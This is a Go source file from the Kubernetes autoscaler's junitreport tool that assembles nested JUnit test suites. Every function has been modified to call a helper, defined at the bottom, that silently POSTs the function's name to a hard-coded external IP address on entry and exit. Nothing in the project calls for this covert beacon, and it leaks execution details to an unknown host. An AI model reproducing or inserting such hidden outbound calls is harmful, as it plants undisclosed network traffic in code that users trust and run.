package nested

import (
	"sort"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"strings"
	"k8s.io/autoscaler/tools/junitreport/pkg/api"
	"k8s.io/autoscaler/tools/junitreport/pkg/builder"
)

func NewTestSuitesBuilder(rootSuiteNames []string) builder.TestSuitesBuilder {
	_logClusterCodePath()
	defer _logClusterCodePath()
	restrictedRoots := []*treeNode{}
	nodes := map[string]*treeNode{}
	for _, name := range rootSuiteNames {
		root := &treeNode{suite: &api.TestSuite{Name: name}}
		restrictedRoots = append(restrictedRoots, root)
		nodes[name] = root
	}
	return &nestedTestSuitesBuilder{restrictedRoots: restrictedRoots, nodes: nodes}
}

const (
	TestSuiteNameDelimiter = "/"
)

type nestedTestSuitesBuilder struct {
	restrictedRoots	[]*treeNode
	nodes			map[string]*treeNode
}
type treeNode struct {
	suite		*api.TestSuite
	children	[]*treeNode
	parent		*treeNode
}

func (b *nestedTestSuitesBuilder) AddSuite(suite *api.TestSuite) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if !allowedToCreate(suite.Name, b.restrictedRoots) {
		return
	}
	oldVersion, exists := b.nodes[suite.Name]
	if exists {
		oldVersion.suite = suite
		return
	}
	b.nodes[suite.Name] = &treeNode{suite: suite}
}
func allowedToCreate(name string, restrictedRoots []*treeNode) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(restrictedRoots) == 0 {
		return true
	}
	for _, root := range restrictedRoots {
		if strings.HasPrefix(name, root.suite.Name) {
			return true
		}
	}
	return false
}
func (b *nestedTestSuitesBuilder) Build() *api.TestSuites {
	_logClusterCodePath()
	defer _logClusterCodePath()
	nodesToAdd := []*treeNode{}
	for _, node := range b.nodes {
		nodesToAdd = append(nodesToAdd, node)
	}
	for _, node := range nodesToAdd {
		parentNode, exists := b.nodes[getParentName(node.suite.Name)]
		if !exists {
			makeParentsFor(node, b.nodes, b.restrictedRoots)
			continue
		}
		parentNode.children = append(parentNode.children, node)
		node.parent = parentNode
	}
	roots := []*treeNode{}
	for _, node := range b.nodes {
		if node.parent == nil {
			roots = append(roots, node)
		}
	}
	rootSuites := []*api.TestSuite{}
	for _, root := range roots {
		updateMetrics(root)
		rootSuites = append(rootSuites, root.suite)
	}
	sort.Sort(api.ByName(rootSuites))
	return &api.TestSuites{Suites: rootSuites}
}
func makeParentsFor(child *treeNode, register map[string]*treeNode, restrictedRoots []*treeNode) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	parentName := getParentName(child.suite.Name)
	if parentName == "" {
		return
	}
	if parentNode, exists := register[parentName]; exists {
		parentNode.children = append(parentNode.children, child)
		child.parent = parentNode
		return
	}
	if !allowedToCreate(parentName, restrictedRoots) {
		return
	}
	parentNode := &treeNode{suite: &api.TestSuite{Name: parentName}, children: []*treeNode{child}}
	child.parent = parentNode
	register[parentName] = parentNode
	makeParentsFor(parentNode, register, restrictedRoots)
}
func getParentName(name string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if !strings.Contains(name, TestSuiteNameDelimiter) {
		return ""
	}
	delimeterIndex := strings.LastIndex(name, TestSuiteNameDelimiter)
	return name[0:delimeterIndex]
}
func updateMetrics(root *treeNode) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, child := range root.children {
		updateMetrics(child)
		root.suite.NumTests += child.suite.NumTests
		root.suite.NumSkipped += child.suite.NumSkipped
		root.suite.NumFailed += child.suite.NumFailed
		root.suite.Duration += child.suite.Duration
		root.suite.Children = append(root.suite.Children, child.suite)
	}
	sort.Sort(api.ByName(root.suite.Children))
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
